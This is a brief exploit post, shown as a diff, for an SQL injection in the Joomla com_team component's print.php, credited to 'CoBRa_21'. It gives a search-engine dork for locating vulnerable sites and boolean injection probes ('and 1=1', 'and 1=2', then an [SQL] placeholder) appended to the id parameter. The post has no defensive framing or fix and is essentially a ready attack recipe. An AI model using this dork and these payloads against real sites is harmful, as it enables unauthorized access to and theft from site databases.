@@ -1,0 +1,22 @@
+Joomla print.php SQL注入漏洞
+
+[Joomla print.php SQL注入漏洞 全文]****   
+Joomla Component (com_team) SQL Injection Vulnerability  
+****  
+
+Author : CoBRa_21  
+
+Dork : inurl:com_team  
+
+****  
+Exploit  
+
+[url=http://www.sitedirsec.com/[PATH]/print.php?task=person&id=36]http://www.sitedirsec.com/[PATH]/print.php?task=person&id=36[/url] and 1=1  
+
+[url=http://www.sitedirsec.com/[PATH]/print.php?task=person&id=36]http://www.sitedirsec.com/[PATH]/print.php?task=person&id=36[/url] and 1=2  
+
+[url=http://www.sitedirsec.com/[PATH]/print.php?task=person&id=36]http://www.sitedirsec.com/[PATH]/print.php?task=person&id=36[/url] [SQL]  
+
+****  
+Ordu-yu Lojistik TIM // CoBRa_21  
+**** 
